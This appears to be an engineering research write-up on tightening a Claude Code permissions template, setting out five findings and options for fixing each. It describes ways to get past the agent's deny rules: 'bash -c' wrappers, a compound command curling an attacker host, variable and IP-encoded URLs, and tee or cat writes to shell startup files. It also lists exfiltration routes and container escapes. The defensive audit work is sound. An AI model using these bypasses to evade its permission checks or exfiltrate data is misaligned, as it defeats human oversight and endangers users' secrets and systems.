# Research: Permissions audit round 2 — CFA Android learnings

Feature: apply the "conservative defaults, local overrides" principle from the 054 epic to 5 remaining gaps in `claude/settings.json` surfaced by cross-referencing CFA Android's PR #8093 permissions review.

Tier: **complex**. Criticality: **high**. Parent backlog: `060-permissions-audit-round-2-cfa-learnings` (uuid `f8a2b3c4-...`).

## Codebase Analysis

### Current settings.json state (relevant entries)

File: `claude/settings.json`, 389 lines. Entries targeted by the 5 findings:

| Finding | Current state | Line |
|---|---|---|
| F1 curl exfil | `Bash(curl *)` in allow | 93 |
| F1 curl exfil | `api.github.com`, `raw.githubusercontent.com`, `registry.npmjs.org`, `*.anthropic.com` in `sandbox.network.allowedDomains` | 363–368 |
| F1 curl exfil | `Bash(curl *\|bash*)` etc. in deny (only pipe-to-shell covered) | 162–165 |
| F1 curl exfil | `Bash(gh gist create *)` in deny (the rule that curl bypasses) | 205 |
| F2 interpreter allows | `Bash(npm *)`, `Bash(pip3 *)`, `Bash(docker *)`, `Bash(make *)`, `Bash(brew *)` in allow | 107, 109, 112, 113, 125 |
| F2 interpreter allows | Only existing deny override is `Bash(npm publish *)` | 160–161 |
| F3 tee bypass | `Bash(tee *)` in allow; `Edit(~/.zshrc)` etc. in deny (Edit-tool only) | 115, 189–193 |
| F4 git checkout -- | `Bash(git checkout *)` in allow; `Bash(git restore *)` in ask | 41, 216 |
| F5 metadata endpoint | No `WebFetch(domain:169.254.169.254)` deny; `localhost`, `127.0.0.1`, `0.0.0.0` are denied | 194–198 |

Sandbox `excludedCommands`: `gh:*`, `git:*`, `WebFetch` (lines 379–383). `curl`, `npm`, `brew`, `docker`, `pip3`, `make`, `tee` all run **under** the sandbox — sandbox network rules apply to them.

### Regression flag discovered during research (NOT in the original 5 findings)

`claude/settings.json:387` contains `"skipDangerousModePermissionPrompt": true`. The 056 review recorded this key as REMOVED. It was silently re-added (by `2948cc9` or a later commit in the 054 epic series). This directly contradicts the epic's "conservative defaults for public safety" framing — a new adopter downloading the template has the "are you sure you want to enable dangerous mode?" prompt pre-disabled. Flagged by the adversarial agent as higher-severity than the 5 findings in scope. **Spec phase must decide whether to bring this into scope as F0 or file a follow-up ticket.**

### In-repo callers (regression risk assessment, grep-verified)

**`curl`** — 2 runtime callsites:
- `hooks/cortex-notify-remote.sh:56` — `curl -s --max-time 5 -d "$MESSAGE" -H ... "https://ntfy.sh/$NTFY_TOPIC"` (ntfy.sh push notifications, NOT GitHub)
- `skills/ui-judge/SKILL.md:40`, `skills/ui-a11y/SKILL.md:30`, `skills/ui-check/SKILL.md:65` — all `curl http://localhost:PORT` (dev-server liveness probes)

**None** touch `api.github.com`, `raw.githubusercontent.com`, `registry.npmjs.org`, or `*.anthropic.com`.

**`docker`** — **zero** callers anywhere. Only appears in `Read(~/.docker/config.json)` deny line and documentation prose.

**`npm`** — runtime references are all in UI skills that run npm in target projects (not cortex-command itself):
- `skills/ui-setup/SKILL.md:46,72,89,102,134` — user-facing `npm install -D <pkg>` instructions
- `skills/ui-judge/SKILL.md:26`, `skills/ui-lint/SKILL.md:27`, `skills/ui-a11y/SKILL.md:38` — guidance about `npm run dev`, `npm i -D @playwright/test`
- `tests/test_output_filter.sh:74,112,131,185,235` — literal string `"npm test"` as mock Bash payloads
- `docs/overnight.md:51` — doc example
- `claude/hooks/output-filters.conf:18` — regex pattern `\bnpm test\b` (substring matcher, not an invocation)

**Regression risk**: UI skills legitimately execute `npm install -D` and `npm run dev` / `npm run <script>` in target projects. Any tightening of `npm *` must preserve these flows or accept the cost of per-session prompts.

**`brew`** — **zero** runtime callers. Appears only in setup-instruction prose in `justfile`, `README.md`, `Agents.md`, `docs/setup.md`.

**`make`** — **zero** runtime callers. No `Makefile` in the repo (`just` is the task runner). Only appears as the English word "make" or in `claude/hooks/output-filters.conf:37` regex `\bmake\s+test\b`.

**`pip3`** — **zero** runtime callers. `uv` is the canonical Python package manager per CLAUDE.md (already in allow as `Bash(uv run *)`, `Bash(uv sync *)`).

**`tee`** — **zero** runtime callers anywhere.

**`git checkout -- <file>`** (destructive discard form) — **zero** callers.
**`git checkout --theirs`** / `--ours` is used by the pipeline fast-path conflict resolver:
- `bin/git-sync-rebase.sh:144` — `git checkout --theirs -- "$filepath"`
- `claude/pipeline/conflict.py:519, 589, 612, 637, 658, 675` — pipeline fast-path invocations
- `claude/pipeline/tests/test_trivial_conflict.py:186` — mocked in tests
- `claude/overnight/prompts/orchestrator-round.md:206` — documentation of the strategy

**Critical constraint**: any F4 rule must NOT match `git checkout --theirs` / `--ours`. This is load-bearing and the pattern behavior is unverified (see Open Question Q1).

**`git restore`** — zero runtime callers (already in ask tier).

### The sync-permissions hook (cortex-sync-permissions.py)

File: `claude/hooks/cortex-sync-permissions.py`, 116 lines. Registered as SessionStart hook in `claude/settings.json:223–231`.

**Behavior (verified by reading the source):**

1. Reads global `~/.claude/settings.json` and project `<cwd>/.claude/settings.local.json`.
2. Short-circuits if: global file missing, local file missing, local has no `permissions` key, hash marker matches current global-perms hash, or new content is byte-identical.
3. Merge is **pure union with dedup, local-first ordering** (`merge_arrays` lines 34–42). Applied identically to `allow`, `deny`, `ask`. `defaultMode` is inherited from global only if unset locally.
4. There is **no subtraction**. Removing an entry from global `allow` does NOT propagate to projects that already have it in `settings.local.json`.

**Implication for each fix category:**

| Fix category | Propagates to existing installs? |
|---|---|
| Add to `deny` | **Yes** — union merge pulls it in on next SessionStart. Deny precedence beats pre-existing allow. |
| Add to `ask` | **Yes** — same union merge. Ask beats allow in evaluation order. |
| Remove from `allow` | **No** — local copy persists forever. Only fresh installs get the tightening. |
| Remove from `sandbox.network.allowedDomains` | **No** — the hook only touches `permissions.*`, not `sandbox.*`. |
| Add to `sandbox.filesystem.denyWrite` (not used here) | **No** — hook doesn't touch sandbox. |

Cortex-command's own `.claude/settings.local.json` has no `permissions` key, so the hook no-ops for this repo — only the global file applies to interactive sessions in cortex-command itself. See "Sync-hook propagation ratchet" in the Adversarial Review section for the cumulative-risk discussion.

### 054-058 epic pattern reference (for spec style match)

**Commits**:
1. `68698ea` — "Add ask/deny entries and remove obsolete top-level keys" (056 — R1+R2+R3+R4+R5 bundled: 14 allow entries removed, 9 deny added, 1 ask added, `skipDangerousModePermissionPrompt` removed, extraneous `model` key removed)
2. `7705f63` — "Narrow allow list for sandbox-excluded commands" (058 part 1 — replaced `Bash(gh *)` with 7 specific read-only patterns; replaced `Bash(git remote *)` with 2 read-only; removed `WebFetch` from allow)
3. `e751820` — "Add deny rules for exfiltration vectors in sandbox-excluded commands" (058 part 2 — 9 deny entries including 4 flag-position variants of `git push https://*`)
4. `2948cc9` — "Remove interpreter escape hatch commands from settings.json allow list" (057 — removed `bash *`, `sh *`, `source *`, `python *`, `python3 *`, `node *`; added targeted replacements `python3 -m claude.*`, `python3 -m json.tool *`, `uv run *`, `uv sync *`)

**Spec style**: R1/R2/R3 requirement numbering, Python assertion acceptance criteria, explicit "Non-Requirements" section documenting accepted tradeoffs and scope boundaries. This round 2 spec should match.

**Accepted tradeoffs carried forward** (from 056/058 specs — these constrain round 2):
- Pre-existing entries in `settings.local.json` persist after removal from global (056 non-req)
- Deny false positives from substring-matching patterns like `Bash(xargs *rm*)` are accepted (056 tradeoff)
- `gh pr create --body` exfiltration is accepted as residual risk (058)
- File-staging commands (`git bundle`, `git format-patch`, `git archive`) are accepted; network layer is the defense (058)
- Pre-existing named remotes bypass `git push <name>` URL deny rules (058)
- `/setup-merge` is additive-only; removal propagation is out of scope (056)

### Existing power-user override documentation (thin)

- `README.md:144–146` — one paragraph explaining `settings.json` as template + `settings.local.json` as per-machine overrides
- `docs/setup.md:142` — one line saying the same
- No `claude/permissions-*.md` or `docs/permissions*` file exists
- `claude/settings.json` has no comments (strict JSON, no inline annotation)

The round-2 ticket AC#3 explicitly adds "Power-user overrides documented in a comment or companion file" — the documentation does not yet exist. The form is undecided (Open Question Q7).

### Overnight runner interaction (confirmed)

`claude/overnight/runner.sh:643–645`:
```bash
claude -p "$FILLED_PROMPT" \
    --dangerously-skip-permissions \
    --max-turns 50 2>&1 & CLAUDE_PID=$!
```

Persistent comment at `runner.sh:848`: "The `--dangerously-skip-permissions` flag must remain."

Worker subagents use `permission_mode="bypassPermissions"` (per `lifecycle/verify-escape-hatch-bypass-mechanism/research.md:100`).

**Implication**: Changes to `permissions.allow/deny/ask` have **zero effect on overnight runs**. Only `sandbox.*` affects overnight security. This means Finding 1 Option A (removing `api.github.com` from `allowedDomains`) is the **only** fix with direct overnight-behavior impact — because overnight honors sandbox even with skipped permissions. All other fixes are interactive-only.

### Integration points & dependencies

1. `just setup` / `just setup-force` / `/setup-merge` — additive-only deployment; tightens for new adopters but not existing users without manual steps.
2. Maintainer's `~/.claude/settings.local.json` — already has broad allow entries synced from prior sessions. Fixes that remove from allow do not auto-clean this file.
3. `cortex-output-filter.sh` + `output-filters.conf` — PreToolUse Bash hook that pattern-matches `npm test`, `make test`, `pytest`. Does not affect permissions.
4. `sandbox.excludedCommands` only excludes `gh:*`, `git:*`, `WebFetch`. Everything else (curl, npm, brew, docker, pip3, make, tee) runs under sandbox.
5. Deny precedence: Claude Code evaluates **deny → ask → allow, first match wins**. Confirmed by 054 epic research and load-bearing for all "add deny/ask" fixes propagating past pre-existing allow entries in `settings.local.json`.
6. Claude Code matchers are **prefix globs with word-boundary rules** (per 058 spec and official docs). Space-before-`*` matters: `Bash(ls *)` matches `ls -la` but not `lsof`.

## Web Research

### Anthropic's official guidance on this exact class

Per `code.claude.com/docs/en/permissions` (verbatim):

> "Bash permission patterns that try to constrain command arguments are fragile. For example, `Bash(curl http://github.com/ *)` intends to restrict curl to GitHub URLs, but won't match variations like: Options before URL … Different protocol … Redirects: `curl -L http://bit.ly/xyz` (redirects to github) … Variables: `URL=http://github.com && curl $URL` … Extra spaces."

Official recommendation for this class of problem:
1. Deny `curl`, `wget`, and similar commands entirely; use `WebFetch(domain:...)` for allowed domains.
2. Use PreToolUse hooks to validate URLs in Bash commands.
3. Instruct Claude via CLAUDE.md about allowed patterns.

Also verbatim from the sandboxing docs: *"Read and Edit deny rules apply to Claude's built-in file tools, not to Bash subprocesses. A `Read(./.env)` deny rule blocks the Read tool but does not prevent `cat .env` in Bash."* The documented fix is `sandbox.filesystem.denyWrite`, not Bash patterns.

**Implication for F3 (tee bypass)**: the architecturally-correct fix is `sandbox.filesystem.denyWrite: ["~/.zshrc", "~/.bashrc", ...]`, NOT a Bash(tee ~/.zshrc) pattern. Bash patterns are documented-fragile.

### Anthropic's own permission templates

`github.com/anthropics/claude-code/tree/main/examples/settings`:
- **settings-lax.json** — just `disableBypassPermissionsMode: "disable"` and `strictKnownMarketplaces: []`.
- **settings-strict.json** — `ask: ["Bash"]` (prompts on every Bash invocation), `deny: ["WebSearch", "WebFetch"]`, `allowManagedPermissionRulesOnly: true`, empty `allowedDomains`.
- **settings-bash-sandbox.json** — `sandbox.enabled: true`, `allowUnsandboxedCommands: false`, empty `excludedCommands`, empty `allowedDomains`. Bash runs only inside the sandbox.

**None of Anthropic's templates include curl/tee/docker/npm/brew/make/pip3 denies or metadata IP denies.** Their approach is orthogonal: either disable Bash entirely (strict) or force everything into the sandbox (bash-sandbox). cortex-command is in a middle ground ("allow most tools, audit specific risks") that Anthropic doesn't ship a template for.

### Safe subcommand sets (per-command findings)

**docker** — No canonical safe list. Anthropic's sandboxing docs explicitly say *"docker is incompatible with running in the sandbox. Consider specifying `docker *` in `excludedCommands`."*
- Read-only-ish: `docker ps`, `docker logs`, `docker images`, `docker version`, `docker inspect` (but `inspect` can leak env-var secrets per HackTricks)
- Never safe: `docker run`, `docker exec` (gives shell into container, often root), `docker build`, `docker cp`, `docker save/load`, `docker commit`
- Known escape: `docker run --privileged`, `-v /:/host`, `docker.sock` access

**npm** — **`npm run <script>` is NEVER safe generically** — the script body is arbitrary code from package.json. RooCode has GHSA-c292-qxq4-4p2v for exactly this class. 2025 supply-chain incidents (Axios, ethers-provider2) demonstrated postinstall scripts shipping RATs. Mitigations: `npm install --ignore-scripts`, pnpm ≥10 disables postinstall by default.
- Read-only: `npm list`, `npm ls`, `npm view`, `npm outdated`, `npm search`, `npm doctor`, `npm --version`, `npm help`
- Never safe without flags: `npm install`, `npm ci`, `npm update`, `npm run <script>`

**brew** — Per Trail of Bits 2024 audit, Homebrew "allows arbitrary code execution by design" — Ruby formulae are executable, can be loaded from arbitrary URLs via `brew tap`.
- Read-only: `brew list`, `brew info`, `brew search`, `brew leaves`, `brew uses`, `brew deps`, `brew outdated`, `brew --version`, `brew config`, `brew doctor`
- Never safe: `brew install`, `brew upgrade`, `brew reinstall`, `brew tap <url>`, `brew cask install`

**make** — **`make -n` is NOT safe.** Per GNU make manual "Instead of Execution" and VS Code makefile-tools issues #505, #506, #562: *"Shell command constructs in the makefile are actually run even in --dry-run mode, and recursive calls to make lose the --dry-run"*. **There is no safe make automation pattern on hostile Makefiles.**

**pip3** — `pip install` runs setup.py during build for sdists. `pip download`, `pip wheel` trigger the same code path. Mitigation: `--only-binary :all:` + `--require-hashes`.
- Read-only: `pip3 list`, `pip3 show`, `pip3 check`, `pip3 freeze`, `pip3 --version`, `pip3 config list`, `pip3 help`
- Never safe: `pip3 install`, `pip3 download`, `pip3 wheel`, `pip3 uninstall`

### Cloud metadata endpoint list (canonical)

| Provider | IPs | Hostnames |
|---|---|---|
| AWS EC2 | `169.254.169.254`, `fd00:ec2::254` (IPv6) | `instance-data.ec2.internal`, `instance-data` |
| AWS ECS | `169.254.170.2` | — |
| GCP | `169.254.169.254` | `metadata.google.internal`, `metadata` |
| Azure | `169.254.169.254` | — (requires `Metadata: true` header, still deny at network) |
| DigitalOcean | `169.254.169.254` | — |
| Oracle Cloud | `192.0.0.192` | — |
| Alibaba Cloud | `100.100.100.200` | — |
| IBM Cloud | `169.254.169.254` | `api.metadata.cloud.ibm.com` |

Documented SSRF risk for AI agents specifically (Render "Security best practices for AI agents"; Capital One 2019 breach used SSRF against 169.254.169.254 as the textbook case).

Claude Code's `WebFetch(domain:...)` syntax is **documented as domain-only** — IP literal support is not documented. `WebFetch(domain:0.0.0.0)` is in 056's deny and was accepted as working without empirical verification.

### Cursor / other-agent precedent

- **Cursor's denylist was demonstrated bypassable** in 2025 by HiddenLayer and BackSlash — OpenAI API key exfiltrated via base64 encoding, subshells, file-write-then-exec. Cursor now recommends allowlist-only and warns against denylists.
- **Claude Code's own deny evaluator may only check the first token of compound commands** per Steve Adams "Your Claude Code Deny List Is Leaky" and community PR #36645 (573-line fix, 34 tests). The in-repo test report at `lifecycle/verify-escape-hatch-bypass-mechanism/test-report.md:46` claims compound decomposition works, but this was NEVER EMPIRICALLY TESTED for compound commands — only for interpreter wrappers. **Load-bearing open question** — see Q3.

### Key links

- Configure permissions: https://code.claude.com/docs/en/permissions
- Sandboxing: https://code.claude.com/docs/en/sandboxing
- Anthropic example settings: https://github.com/anthropics/claude-code/tree/main/examples/settings
- Cursor denylist bypass: https://www.backslash.security/blog/cursor-ai-security-flaw-autorun-denylist
- Steve Adams "Claude Code Deny List Is Leaky": https://steve-adams.me/claude-code-deny-list-is-leaky.html
- HackTricks Cloud SSRF: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
- GNU make "Instead of Execution": https://www.gnu.org/software/make/manual/html_node/Instead-of-Execution.html
- Trail of Bits Homebrew audit: https://blog.trailofbits.com/2024/07/30/our-audit-of-homebrew/
- RooCode npm postinstall GHSA: https://github.com/RooCodeInc/Roo-Code/security/advisories/GHSA-c292-qxq4-4p2v

## Requirements & Constraints

### requirements/project.md — Defense-in-depth for permissions (verbatim)

> **Defense-in-depth for permissions**: The global `settings.json` template ships conservative defaults — minimal allow list, comprehensive deny list, sandbox enabled. For sandbox-excluded commands (git, gh, WebFetch), the permission allow/deny list is the sole enforcement layer; keep global allows read-only and let write operations fall through to prompt. The overnight runner bypasses permissions entirely (`--dangerously-skip-permissions`), making sandbox configuration the critical security surface for autonomous execution.

Other relevant quality attributes:

- **Maintainability through simplicity**: iteratively trim skills and workflows.
- **Complexity**: "Must earn its place by solving a real problem that exists now. When in doubt, the simpler solution is correct."
- **Overview**: "Primarily personal tooling, shared publicly for others to clone or fork." (Public template → conservative defaults have high blast radius.)

### 054-058 epic framing (DR-7 resolution, verbatim)

> "Template optimizes for public safety. Conservative defaults in the shipped template; primary user adds power-user permissions to `settings.local.json`."

### 054 open question inherited by round 2 (NOT resolved by the epic)

> "**settings.local.json as mitigation**: Multiple DRs recommend pushing removed items into `settings.local.json`. But this file is not version-controlled, diverges over time, and conflicts with the project's symlink-everything philosophy. Is there a better mechanism for the owner's power-user additions?"

Round 2 inherits this tension. The AC#3 docs deliverable is partial mitigation (tell adopters what to add) but does not resolve the root issue (version-control of power-user additions).

### 057 verified bypass finding (load-bearing for F4 framing)

From `lifecycle/verify-escape-hatch-bypass-mechanism/spec.md`: *"Spike 055 confirmed the bypass is OPEN. All four test cases (bash -c, bash -c control, python3 -c, sh -c) returned ALLOW — deny rules are NOT evaluated through interpreter wrappers."*

Implication: any F4 ask on `git checkout -- *` can be trivially bypassed by `bash -c "git checkout -- ."`. The fix is best-effort naive-path mitigation only. The spec must state this explicitly.

### User feedback memories (durable)

**`feedback_minimal_global_allows.md`** (verbatim rule):
> "Global allow list should be as small as possible... Prefer falling through to prompt for write operations rather than auto-allowing them globally."
>
> **Why:** Overnight runs with `--dangerously-skip-permissions`, so allow list only affects interactive sessions. Users of other projects don't want cortex-command's allows overriding their preferences.
>
> **How to apply:** Default to read-only allows. Writes should fall to prompt.

**`feedback_minimal_fixes.md`** (verbatim rule):
> "Don't build defense-in-depth layers, redundant handlers, or 'belt-and-suspenders' mitigations. Fix the root problem with the simplest approach and trust it works."

**Resolving the apparent tension**: project-level "defense in depth" is about the architecture (permissions layer + sandbox layer), not about stacking redundant fixes within a single layer. For this ticket, "minimal fixes" means pick ONE mitigation per finding, not three overlapping ones.

### Answers to specific requirements questions

**"What does conservative defaults mean concretely?"** — (a) minimal allow, (b) comprehensive deny, (c) sandbox enabled, (d) for sandbox-excluded commands, allow is read-only and writes fall to prompt. **Written test** from the ticket itself: *"if a user who doesn't understand the tradeoff inherits this permission, is that acceptable?"*

**"What does the overnight runner need?"** — **No allow-list entries at all.** Overnight bypasses permissions entirely. Removing from allow cannot break overnight. **This is explicitly stated in 056, 058, and verified in `multi-agent.md`.**

**"Backwards-compatibility requirement?"** — Explicitly out of scope per 056 non-requirements: `/setup-merge` is additive-only; removal propagation to existing installs is out of scope. Users can run `just setup-force` to overwrite.

**"No regression in interactive or overnight workflows — verification process?"** — No documented formal process. 056 used spec-compliance grep/python assertions plus JSON validity check. Overnight regression is a no-op by construction (overnight bypasses permissions). Round 2 should match this level of rigor.

**"Guidance on power-user override docs form?"** — Ticket says "a comment or companion file" without picking. 054 raised this as an Open Question and did not resolve it. **Deferred to spec phase user decision** (see Q7).

### Explicit constraints summary

**Required** (from requirements + epic + ticket):
- Conservative defaults: minimal allow, comprehensive deny, sandbox enabled
- For sandbox-excluded commands, allow is read-only and writes fall to prompt
- Each F1–F5 must be "consciously accepted or fixed"
- Blanket allows for docker/npm/brew/make/pip3 must be scoped or moved to ask
- Power-user override documentation must exist somewhere adopters can find it
- `claude/settings.json` must remain valid JSON
- No regression in interactive or overnight workflows (AC#4)
- Edit the repo file, not the deployed `~/.claude/settings.json` directly

**Prohibited / de facto constraints**:
- Do NOT stack redundant mitigations — one clean fix per finding
- Do NOT modify `cortex-sync-permissions.py` as part of this ticket (056 non-req)
- Do NOT try to propagate removals to existing installs (056 non-req)
- Do NOT clean up `~/.claude/settings.local.json` as part of this ticket

**Out of scope** (060 ticket body + 054 carryovers):
- Read/Bash deny bypass via cat/grep (fundamental limitation accepted in 054 research)
- Sandbox filesystem read scope (not configurable via permissions)
- Interpreter-wrapper bypass (057 accepted this as OPEN)
- Resolution of the "settings.local.json vs version control" open question

## Tradeoffs & Alternatives

### Finding 1 — curl exfiltration via sandbox-allowed api.github.com

Three ticket-proposed options, analysis:

- **Option A — Remove `api.github.com` from `sandbox.network.allowedDomains`**
  - **Pros**: Closes the network-layer path cleanly. Grep-verified: no repo-internal callers hit `api.github.com` directly from Bash. The entry is effectively unused for in-repo workloads.
  - **Cons**: Does not propagate to existing installs (sync hook doesn't touch sandbox config). Hard-to-verify dependencies may exist — Claude Code plugins, `gh` tooling via sandbox, WebFetch to github URLs. **Unverified load-bearing assumption** — see Q5/Q6.
  - **Overnight impact**: This is the ONLY fix that affects overnight, because overnight honors sandbox even with skipped permissions. If overnight subagents ever touch `api.github.com` from inside the sandbox, removing this silently breaks them.

- **Option B — Add `Bash(curl *api.github.com*)` to deny**
  - **Pros**: Targeted. Propagates via sync hook union.
  - **Cons**: Anthropic docs explicitly label this class of pattern **fragile**. Trivially bypassable via `URL=https://api.github.com/gists; curl $URL`, URL encoding, IP decimal (`curl http://140.82.x.x/`), wget, python urllib, etc. Protects only one domain — other `allowedDomains` entries (`raw.githubusercontent.com`, `registry.npmjs.org`, `*.anthropic.com`) still admit curl exfiltration.

- **Option C — Move `Bash(curl *)` from allow to ask tier**
  - **Pros**: Covers all curl destinations. Propagates via sync hook union. Ask precedence beats existing `settings.local.json` allow entries. One-line fix.
  - **Cons**: Session-scoped prompt on first curl — one extra prompt per interactive session. `ui-judge` / `ui-a11y` / `ui-check` skills hit localhost via curl; each would prompt once per session. Overnight unaffected. **Open question Q3**: does the compound-command bypass (`foo && curl http://attacker/`) defeat ask tier? Unverified.

**Initial recommendation**: A + C combination — close both the network layer (A) and the command layer (C). But adversarial review flagged that A carries the only real dogfood risk in the whole ticket. **Spec phase decision**: (i) whether to take both or just one; (ii) whether to gate A on live verification; (iii) ordering (adversarial recommends F1 first specifically for dogfood-risk early detection).

**Fix Option B rejected**: brittle pattern per Anthropic's own docs. Use only if A and C are both refused for some reason.

### Finding 2 — Blanket interpreter-adjacent allows

Per-command analysis (repo runtime usage + risk + recommendation):

| Command | Repo runtime usage | Risk | Initial recommendation |
|---|---|---|---|
| `docker *` | Zero | High (`docker run -v /:/host`, docker.sock escape) | **Remove from allow entirely.** No-cost tightening. |
| `make *` | Zero (no Makefile; just is the runner) | High (`make -n` is NOT safe per GNU docs) | **Remove from allow entirely.** |
| `pip3 *` | Zero (uv is the Python package manager) | Medium (post-install scripts) | **Remove from allow entirely.** |
| `npm *` | UI skills run `npm install -D`, `npm run <script>` in target projects | High (postinstall scripts, arbitrary package.json script bodies) | **Contested** — see below. |
| `brew *` | Zero (only in setup-instruction prose) | Medium (Ruby formulae are arbitrary code; formula loading from URLs) | Scope to read-only: `Bash(brew list *)`, `Bash(brew info *)`, `Bash(brew search *)`, `Bash(brew --version)`, `Bash(brew config)`, `Bash(brew doctor)`, `Bash(brew leaves)`, `Bash(brew deps *)`, `Bash(brew outdated *)`. |

**The `npm` contested decision**:

- **Scoped approach** (initial recommendation from Tradeoffs Agent): `Bash(npm test *)`, `Bash(npm run test *)`, `Bash(npm run build *)`, `Bash(npm run lint *)`, `Bash(npm run dev *)`, `Bash(npm ls *)`, `Bash(npm view *)`, `Bash(npm pack --dry-run *)`. Keeps UI-dev loop working without prompts.
- **Adversarial rebuttal**:
  1. `npm run <script>` runs arbitrary shell from `package.json` — scoping by script NAME provides zero defense against malicious `package.json` content. Security theater at the actual threat level.
  2. **The glob `Bash(npm run test *)` likely does NOT match `npm run test:unit` or `npm run test-unit`** — the space-before-`*` rule means `test *` requires a space after `test`, which `test:unit` and `test-unit` do not have. Common script-name conventions (`test:unit`, `test:e2e`, `lint:fix`, `build:prod`) are all excluded.
  3. The scoped set is missing `npm install` / `npm ci` which UI skills legitimately need. Without them, `npm install -D @playwright/test` prompts every session.

- **Adversarial alternative**: put `Bash(npm *)` wholesale in ask tier. Simpler, no glob-matching hazards, no false-assurance from the scoped list. UI skills prompt once per session — acceptable friction.

- **Spec phase decision**: scope vs ask. Recommend **ask tier wholesale** unless the spec phase user explicitly prefers the scoped approach AND the patterns are verified empirically to match the UI skills' actual commands.

### Finding 3 — tee bypass of Edit(~/.zshrc) deny

- **Option A — Targeted deny `Bash(tee *~/.zshrc*)`, etc.**
  - Pros: Surgical.
  - Cons: Brittle. Trivially bypassable via `F=~/.zshrc; tee $F`, absolute path `tee /Users/foo/.zshrc`, same-directory symlink target, or `tee < other > ~/.zshrc`. Same class as curl-arg patterns that Anthropic docs warn against.

- **Option B — Move `Bash(tee *)` wholesale to ask**
  - Pros: Covers all tee destinations. Zero runtime cost (grep-verified: no callers anywhere). Propagates via sync hook. Consistent with 054's "move destructive to ask" pattern (git restore).
  - Cons: Does not prevent other file-writing bypasses (`cat > ~/.zshrc`, `dd of=...`, `python3 -c "open..."`, `printf ... > ~/.zshrc`). The Edit deny is inherently bypassable at the Bash layer — this is documented in Anthropic's sandboxing docs. **True architectural fix** is `sandbox.filesystem.denyWrite`, out of scope for this ticket.

- **Adversarial note**: moving tee to ask is effectively "remove tee from allow" because there are zero callers. Ask gives the user a prompt if tee is actually invoked; allow-absence gives them the same prompt. The difference is signaling: ask is explicit, allow-absence is silent. Prefer ask for the explicit signal.

**Initial recommendation**: **Option B — tee → ask wholesale**. Acknowledge in spec that this does not close the full bypass class (cat/dd/python/printf) and cite the architectural sandbox fix as the long-term solution.

### Finding 4 — `git checkout --` discards changes

- **Option A — Add `Bash(git checkout -- *)` to ask**
  - Pros: Matches 054's `Bash(git restore *)` ask treatment symmetrically. Ask beats allow in evaluation order. One-line fix.
  - **Cons — load-bearing unknown**: does the pattern `git checkout -- *` accidentally match `git checkout --theirs file.py`? The literal substring `git checkout --` is a prefix of `git checkout --theirs`. If the matcher is naive substring, the pattern catches `--theirs`/`--ours` — which breaks pipeline fast-path conflict resolution AND interactive `--theirs` for manual conflict work. **See Q1**.

- **Option B — Add `Bash(git checkout -- *)` to deny**
  - Rejected: inconsistent with 054's ask treatment of the equivalent-risk `git restore *`. No override mechanism if user legitimately needs to discard changes.

- **Option C — Move `Bash(git checkout *)` wholesale to ask**
  - Rejected: breaks branch-switching (the most common git operation). High friction.

- **Option D (adversarial alternative) — Enumerate safe subcommands, let unsafe forms fall through**
  - Replace `Bash(git checkout *)` with an enumerated allow set: `Bash(git checkout --theirs *)`, `Bash(git checkout --ours *)`, `Bash(git checkout -b *)`, `Bash(git checkout main)`, `Bash(git checkout main *)`, branch-name patterns, etc.
  - Pros: No pattern-matching hazards. Explicit about what's safe.
  - Cons: More work. Branch-name pattern enumeration is open-ended. Likely misses legitimate forms.

- **Option E (proposed) — Ask on `Bash(git checkout -- .)` specifically** (the literal dot form, i.e., the "nuke all uncommitted changes" form)
  - Pros: Narrowest possible pattern. Catches the worst case (`git checkout -- .`) without ambiguity.
  - Cons: Does not catch `git checkout -- file1 file2`, `git checkout -- subdir/`, etc.

**Initial recommendation**: Option A, **pending empirical verification of Q1**. If Q1 shows the pattern matches `--theirs`, fall back to Option D or add an explicit `Bash(git checkout --theirs *)` allow entry before the ask. **Spec must include a live pattern test in the acceptance criteria.**

**Concern regardless of option**: 057 proved interpreter-wrapper bypass is OPEN. `bash -c "git checkout -- ."` trivially bypasses any Bash pattern deny/ask. F4 is best-effort naive-path mitigation; the spec must state this explicitly and not claim comprehensive protection.

### Finding 5 — Cloud metadata endpoint

- **Option A — Single IP: `WebFetch(domain:169.254.169.254)`** (ticket proposal)
  - Matches AWS/GCP/Azure/Alibaba/DO/Oracle (they converge on this IP)
  - Misses: AWS ECS (`169.254.170.2`), GCP DNS (`metadata.google.internal`, `metadata`), Oracle variant (`192.0.0.192`), Alibaba (`100.100.100.200`), IBM (`api.metadata.cloud.ibm.com`), AWS IPv6 (`fd00:ec2::254`), EC2 DNS forms.

- **Option B — Broader deny covering all known endpoints** (initial recommendation)
  - Add: `WebFetch(domain:169.254.169.254)`, `WebFetch(domain:169.254.170.2)`, `WebFetch(domain:metadata.google.internal)`, `WebFetch(domain:api.metadata.cloud.ibm.com)`, `WebFetch(domain:instance-data.ec2.internal)`
  - Cost: 5 deny lines. Benefit: comprehensive.
  - **Adversarial pushback on `WebFetch(domain:metadata)` short form**: may collide with legitimate internal DNS entries resolving `metadata` to a corporate service. Drop `metadata` short form; keep fully-qualified entries.

- **Option C — Add Bash-level denies too** (`Bash(curl *169.254.169.254*)`)
  - Rejected: brittle (decimal IP encoding, variable indirection). Covered indirectly by F1 Option C (curl → ask).

- **Load-bearing unknown**: `WebFetch(domain:<IP literal>)` syntax is documented as **domain-only**. The existing `WebFetch(domain:0.0.0.0)` deny from 056 was never empirically verified — it's in the JSON, but no one ran `WebFetch https://0.0.0.0/` against it. **See Q4**. If IP-literal matching silently fails, F5 ships as a no-op.

**Initial recommendation**: Option B (broader deny list, excluding short-form `metadata`). Spec phase must mandate empirical verification of the IP-literal matcher — either live test or documented acknowledgment that verification is deferred.

### Cross-cutting: commit ordering

- **Bundled single commit**: harder to revert individually; matches 056's consolidated-commit style.
- **Per-finding commits within one PR**: matches 054 epic's actual shipping pattern (verified via git log). Each commit revertable independently. Bisect-friendly.
- **Per-finding separate PRs**: overkill.

**Initial recommendation**: per-finding commits within one PR, low-risk-to-high-risk order: **F5 → F3 → F4 → F1 → F2**.

**Adversarial rebuttal on ordering**: F1 is the ONLY fix with dogfood risk (api.github.com removal can break plugin fetching, gh tooling via sandbox, WebFetch to github URLs). Putting it last means if it breaks dogfood, the earlier 4 commits are already merged and the template is in an intermediate state. Adversarial recommends: **F0 (skipDangerousModePermissionPrompt delete, trivial) → F1 (gated on live verification) → F5 → F3 → F4 → F2**. Discover dogfood breakage as early as possible.

**Spec phase decision**: ordering (agent recommendations differ); whether to bring F0 into scope.

### Cross-cutting: power-user override documentation form

